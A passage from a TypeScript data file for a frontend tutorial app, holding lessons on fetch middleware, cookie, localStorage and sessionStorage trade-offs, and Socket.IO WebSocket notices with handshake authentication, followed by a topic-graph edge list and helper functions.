          { type: 'p', text: 'Every time you wrap `fetch` to add a header, refresh a token on 401, or unwrap `{ data }` — that is middleware. Centralize it **once**. If every component attaches `Authorization` by hand, the eleventh call forgets, and **19 · Tokens** becomes folklore.' },
          {
            type: 'pre',
            lines: `async function api(path, init) {
  const res = await fetch(path, {
    ...init,
    headers: { ...authHeaders(), ...init?.headers },
  })
  if (res.status === 401) { logout(); throw new Error("auth") }
  return res.json()
}`,
          },
          { type: 'p', text: 'Do not put **business rules** here (“if the cart is empty, rewrite the URL”). That belongs in **11 · State** or the page. Middleware is CORS, auth stamp, logging, locale — the hallway, not the classroom. Same rule as Backend · Middleware.' },
        ],
      },
      {
        heading: '5. Quick map',
        blocks: [
          {
            type: 'callout',
            lines: [
              '**Watch / read.** [Airport metaphor (YouTube)](https://www.youtube.com/watch?v=Lb-5ziwsqpc) · [Nuxt route middleware](https://nuxt.com/docs/4.x/directory-structure/app/middleware) · [Next.js middleware (Contentful guide)](https://www.contentful.com/blog/next-js-middleware/).',
              '**`next()` or redirect.** Silence is a hung navigation.',
              '**Three hallways.** Page, HTTP server, fetch. Do not use one as the other. None of them replace AuthZ on the API.',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'storage',
    n: 25,
    title: 'Browser Storage: Cookie, localStorage, sessionStorage',
    label: 'Storage',
    cluster: 'memory',
    x: 1320,
    y: 300,
    gist: 'Do not treat JWT, Session, Cookie, localStorage, and sessionStorage as five separate choices. They are three layers: token shape, server strategy, and storage location. The right drawer depends on lifetime, not fashion.',
    studio: 'notice',
    remember: [
      'Cookie = browser sends automatically on every HTTP request. HttpOnly = JS cannot read it. Good for session ids.',
      'localStorage = a locker in the building. Survives tab close and reboot. Theme, “don’t show tour again.”',
      'sessionStorage = sticky note on this desk. Dies when the tab closes. Perfect for “already shown this popup this visit.”',
    ],
    sections: [
      {
        heading: '1. Before we start — three layers',
        blocks: [
          { type: 'p', text: 'People often ask, “Should we use Session or JWT?” or “Cookie or localStorage?” Those questions are not opposites. Think of it as three separate questions:' },
          {
            type: 'ol',
            items: [
              '**Token shape:** JWT (signed JSON) or opaque random string?',
              '**Server strategy:** Does the server remember you (session) or does it only verify a token you carry (stateless)?',
              '**Storage location:** Where does the browser keep the token? Cookie, localStorage, or sessionStorage?',
            ],
          },
          { type: 'p', text: 'Real example: in an app with an announcement popup, an admin writes a new notice, the server pushes it over WebSocket, and the tab shows the popup. Where do we store “I already saw this”? The answer is a storage lesson, not a WebSocket lesson.' },
        ],
      },
      {
        heading: '2. Analogy for memory',
        blocks: [
          {
            type: 'table',
            columns: ['Drawer', 'Analogy', 'Lifetime', 'Sent with HTTP?'],
            rows: [
              ['**Cookie**', 'A stamp the bank gives you; you show it every visit', 'Until expiry or browser clears it', 'Yes — automatically'],
              ['**localStorage**', 'A locker in the building', 'Until you removeItem or clear site data', 'No'],
              ['**sessionStorage**', 'A sticky note on this desk', 'Until the tab closes', 'No'],
            ],
          },
          {
            type: 'ul',
            items: [
              '**Cookie** is good for session ids because the browser sends it automatically. HttpOnly flag means JavaScript cannot read it (XSS protection).',
              '**localStorage** is good for theme, “don’t show the tour again,” cart cache — anything that should be remembered for a long time and is not secret.',
              '**sessionStorage** is good for “work inside this tab” — draft form, or seen popup keys.',
            ],
          },
        ],
      },
      {
        heading: '3. Real example: announcement popup “seen” keys',
        blocks: [
          { type: 'p', text: 'We do not want the popup to show again every time the user navigates. Where do we put the key? Answer: **sessionStorage**.' },
          { type: 'p', text: 'Why? Because “this visit” means **this tab**. If the user closes the tab and comes back tomorrow, it is a new visit; they can see the notice again. If we used localStorage, the same notice would stay hidden forever until an admin edits it.' },
          {
            type: 'pre',
            lines: `// when the popup opens
sessionStorage.setItem("notice_shown_keys", JSON.stringify([
  "n_maintenance_2026-09-01T10:00:00Z"
]))

// Home → Settings in the same tab: still there, no second popup
// Close tab → key is gone → next visit can show the popup again`,
          },
          { type: 'p', text: '**Key trick:** key = `id + updatedAt`. If the admin edits an old notice (same `id`), `updatedAt` becomes a new timestamp → new key → popup shows again. If you only store `id`, an edited notice would never re-appear.' },
          {
            type: 'callout',
            lines: [
              '**Socket delivers the list.** Storage remembers the seeing. Do not mix the two jobs.',
              '**Logout clears the drawer.** A different user should not inherit “already seen.”',
            ],
          },
        ],
      },
      {
        heading: '4. Cookie flags — for tokens in cookies',
        blocks: [
          { type: 'p', text: 'When putting an auth token in a cookie (for example a session id), keep these in mind:' },
          {
            type: 'ul',
            items: [
              '**HttpOnly** — `document.cookie` cannot read it. protects against XSS stealing the token.',
              '**Secure** — HTTPS only.',
              '**SameSite=Lax/Strict** — protects against CSRF by not sending the cookie on cross-site requests.',
              '**Size** — cookie ~4KB; localStorage ~5MB. Do not dump a JSON cart into a cookie.',
            ],
          },
          { type: 'p', text: 'In the app this studio simulates (the SPA), JWT is kept in **localStorage** and sent as `Authorization: Bearer`. That is not the safest pattern, but it is a common SPA trade. For production I would prefer HttpOnly cookie + refresh rotation.' },
        ],
      },
      {
        heading: '5. Interview Q&A',
        blocks: [
          {
            type: 'h3',
            text: 'Q1: Cookie vs localStorage vs sessionStorage?',
          },
          {
            type: 'p',
            text: 'A: Cookie rides every HTTP request automatically, ~4KB, can be HttpOnly/Secure. localStorage survives tab close, ~5MB, JS-readable. sessionStorage is tab-only, gone on close.',
          },
          {
            type: 'h3',
            text: 'Q2: Where should a JWT live?',
          },
          {
            type: 'p',
            text: 'A: Ideally in an HttpOnly Secure cookie or short-lived memory. localStorage is convenient for SPAs but XSS can steal it. We accept that trade only when the app stamps Bearer itself.',
          },
          {
            type: 'h3',
            text: 'Q3: Why use sessionStorage for “already seen” popup?',
          },
          {
            type: 'p',
            text: 'A: Because “seen this visit” means this tab. sessionStorage dies on close, so the next visit can show the notice again. localStorage would hide it forever until an edit.',
          },
          {
            type: 'h3',
            text: 'Q4: Why key = id + updatedAt?',
          },
          {
            type: 'p',
            text: 'A: Same id with a new updatedAt means the admin edited the notice. We want that edited version to pop again, so the key must include the timestamp.',
          },
        ],
      },
      {
        heading: '6. 30-second summary',
        blocks: [
          {
            type: 'callout',
            lines: [
              'Storage is about lifetime. Cookie = HTTP + server. localStorage = origin + tomorrow. sessionStorage = tab + now.',
              'The popup “seen” key lives in sessionStorage because it is a per-tab, per-visit decision.',
              'Key shape `id_updatedAt` lets an edited notice pop again.',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'websocket',
    n: 26,
    title: 'WebSocket: Phone Call, Not Letter',
    label: 'WebSocket',
    cluster: 'wire',
    x: 400,
    y: 780,
    gist: 'HTTP is a letter: you send, they reply, done. WebSocket is a phone call: the line stays open, either side can speak. Use it when waiting for the next poll would feel broken — live notice, chat, ticker.',
    studio: 'notice',
    remember: [
      'HTTP = request → response → done. WebSocket = connect → many frames both ways → close.',
      'Socket.IO adds event names, JSON, reconnect, namespaces. The body is still WebSocket frames.',
      'Auth the handshake. No token → disconnect. `client.emit` answers one tab; `server.emit` broadcasts.',
    ],
    sections: [
      {
        heading: '1. Letter vs phone call',
        blocks: [
          { type: 'p', text: 'Think about asking the server for information:' },
          {
            type: 'ul',
            items: [
              '**HTTP (fetch)** = you knock, they hand you a note, they close the door. To get a new notice you must knock again.',
              '**WebSocket** = they leave the walkie-talkie on. Either side can press the button anytime.',
            ],
          },
          {
            type: 'table',
            columns: ['', 'HTTP', 'WebSocket'],
            rows: [
              ['Shape', 'Request → response → done', 'Connect → many messages → close'],
              ['Who speaks first', 'Client every time', 'Either side after connect'],
              ['Best for', 'Load page, submit form, REST', 'Chat, live notice, price ticker'],
              ['New data', 'Poll or refresh', 'Push from server instantly'],
            ],
          },
          { type: 'p', text: 'Why not poll? Polling every 2 seconds wastes battery, wastes server CPU, and you are still up to 2 seconds late. WebSocket pushes the instant the admin clicks publish.' },
        ],
      },
      {
        heading: '2. Real example: admin publishes → every tab pops',
        blocks: [
          { type: 'p', text: 'The story behind this studio:' },
          {
            type: 'ol',
            items: [
              'Admin writes a new notice and clicks Save.',
              'Server writes to database, then calls `noticeGateway.broadcastList()`.',
              'Gateway does `server.emit("notice:list", { data })` on namespace `/event`.',
              'Every connected tab receives the event and updates the store.',
              'The tab checks sessionStorage: is this `id_updatedAt` already seen? If not, show the popup.',
            ],
          },
          {
            type: 'pre',
            lines: `// Frontend: subscribe once
socket.on("notice:list", ({ data }) => {
  store.setNotices(data)
  // popup policy lives in Storage (25), not the socket
})

// Backend: broadcast after write
async broadcastList() {
  const rows = await notices.findActive()
  this.server.emit("notice:list", { data: rows })
}`,
          },
          { type: 'p', text: 'Remember: socket delivers the list; sessionStorage decides whether to show the popup. Two jobs, two places.' },
        ],
      },
      {
        heading: '3. Socket.IO = clothes on the pipe',
        blocks: [
          { type: 'p', text: 'We can use raw `new WebSocket(url)`, but Socket.IO gives us event names, auto-reconnect, namespaces, and JSON parsing. Namespace `/event` is like a path on the same server.' },
          {
            type: 'pre',
            lines: `const socket = io(apiBase + "/event", {
  transports: ["websocket"],
  reconnection: true,
  auth: { token: accessToken },
})

socket.on("connect", () => { /* pipe is up */ })
socket.emit("notice:list")              // ask for current list
socket.on("notice:list", ({ data }) => { // listen for updates
  store.setNotices(data)
})`,
          },
          { type: 'p', text: 'For a cold load (first paint), we still call `GET /notices` over HTTP. WebSocket is for later — when the admin publishes next.' },
        ],
      },
      {
        heading: '4. Backend: open the pipe, check the token',
        blocks: [
          { type: 'p', text: 'Opening a WebSocket is also an AuthN door. No token → emit error → disconnect.' },
          {
            type: 'pre',
            lines: `@WebSocketGateway({ namespace: "/event" })
export class InitGateway implements OnGatewayConnection {
  async handleConnection(client: Socket) {
    const token = client.handshake.auth?.token
    if (!token) {
      client.emit("connection_error", { code: "TOKEN_REQUIRED" })
      client.disconnect(true)
      return
    }
    const payload = await tokenService.verify(token)
    if (!payload) {
      client.disconnect(true)
      return
    }
    client.data.userId = payload.sub
  }
}`,
          },
          { type: 'p', text: 'CORS / cookie flags do not protect WebSocket. It is another door. You must still authenticate on connect and authorize on every emit.' },
        ],
      },
      {
        heading: '5. Backend: client.emit vs server.emit',
        blocks: [
          { type: 'p', text: 'These two words are easy to confuse:' },
          {
            type: 'ul',
            items: [
              '**`client.emit(event, payload)`** — reply to **this** socket only. Use when a tab asks `notice:list` to refresh its own copy.',
              '**`server.emit(event, payload)`** — broadcast to **every** socket on the namespace. Use when admin writes, deletes, or edits a notice.',
            ],
          },
          { type: 'p', text: 'Do both: snapshot on ask, megaphone on write. If you only broadcast, a tab that connects late sees nothing until the next edit. If you only reply on ask, other tabs stay stale when admin writes.' },
          {
            type: 'kid',
            items: [
              'One kid asks “what is on the board?” — show that kid only.',
              'The teacher changes the board — shout to the whole class.',
            ],
          },
        ],
      },
      {
        heading: '6. What NOT to put on WebSocket',
        blocks: [
          {
            type: 'ul',
            items: [
              '**Form submission** — POST already works. Do not invent `form:submit` on the socket unless you want two APIs for one write.',
              '**Private messages** — a namespace broadcast goes to everyone. Send to a specific user socket or a room after AuthZ.',
              '**Big payloads** — images/videos stay as URLs. The pipe is not a CDN.',
              '**The only source of truth** — the database is truth. The socket emit is just a hint to refresh.',
            ],
          },
        ],
      },
      {
        heading: '7. Interview Q&A',
        blocks: [
          {
            type: 'h3',
            text: 'Q1: HTTP vs WebSocket?',
          },
          {
            type: 'p',
            text: 'A: HTTP is request/response, stateless. WebSocket is a persistent duplex connection; either side can push messages after one handshake.',
          },
          {
            type: 'h3',
            text: 'Q2: When do you use WebSocket?',
          },
          {
            type: 'p',
            text: 'A: When waiting for the next poll would make the product feel dead: live notices, chat, price tickers, presence.',
          },
          {
            type: 'h3',
            text: 'Q3: How do you authenticate WebSocket?',
          },
          {
            type: 'p',
            text: 'A: On the handshake — token in `auth` or cookie. No token → disconnect. Never let an anonymous socket sit on a namespace that later broadcasts user data.',
          },
          {
            type: 'h3',
            text: 'Q4: client.emit vs server.emit?',
          },
          {
            type: 'p',
            text: 'A: `client.emit` answers the asking socket. `server.emit` broadcasts to all sockets on the namespace. Use both: snapshot on ask, broadcast on write.',
          },
        ],
      },
      {
        heading: '8. 30-second summary',
        blocks: [
          {
            type: 'callout',
            lines: [
              'HTTP = letter. WebSocket = phone call. Use the phone when waiting feels broken.',
              'Auth the handshake. Snapshot on ask. Broadcast on write.',
              'Socket delivers the list; Storage decides whether to show the popup.',
            ],
          },
        ],
      },
    ],
  },
];

export const graphEdges: GraphEdge[] = [
  { from: 'high-level', to: 'browser' },
  { from: 'browser', to: 'dom' },
  { from: 'dom', to: 'render' },
  { from: 'dom', to: 'events' },
  { from: 'dom', to: 'xss' },
  { from: 'events', to: 'state' },
  { from: 'components', to: 'props' },
  { from: 'components', to: 'reusable' },
  { from: 'reusable', to: 'props' },
  { from: 'props', to: 'local-state' },
  { from: 'props', to: 'state' },
  { from: 'routing', to: 'url-state' },
  { from: 'routing', to: 'middleware' },
  { from: 'middleware', to: 'security' },
  { from: 'middleware', to: 'fetch' },
  { from: 'local-state', to: 'state' },
  { from: 'state', to: 'derived' },
  { from: 'state', to: 'url-state' },
  { from: 'fetch', to: 'client-cache' },
  { from: 'fetch', to: 'state' },
  { from: 'forms', to: 'fetch' },
  { from: 'forms', to: 'security' },
  { from: 'security', to: 'xss' },
  { from: 'security', to: 'tokens' },
  { from: 'tokens', to: 'fetch' },
  { from: 'bundles', to: 'perf' },
  { from: 'testing', to: 'state' },
  { from: 'testing', to: 'security' },
  { from: 'state', to: 'storage' },
  { from: 'storage', to: 'tokens' },
  { from: 'storage', to: 'websocket' },
  { from: 'fetch', to: 'websocket' },
  { from: 'websocket', to: 'state' },
];

export function topicById(id: string) {
  return topics.find((topic) => topic.id === id);
}

export const topicsInOrder = [...topics].sort((a, b) => a.n - b.n);

export function neighborTopics(id: string) {
  const index = topicsInOrder.findIndex((topic) => topic.id === id);
  return {
    prev: index > 0 ? topicsInOrder[index - 1] : null,
    next: index >= 0 && index < topicsInOrder.length - 1 ? topicsInOrder[index + 1] : null,
  };
}
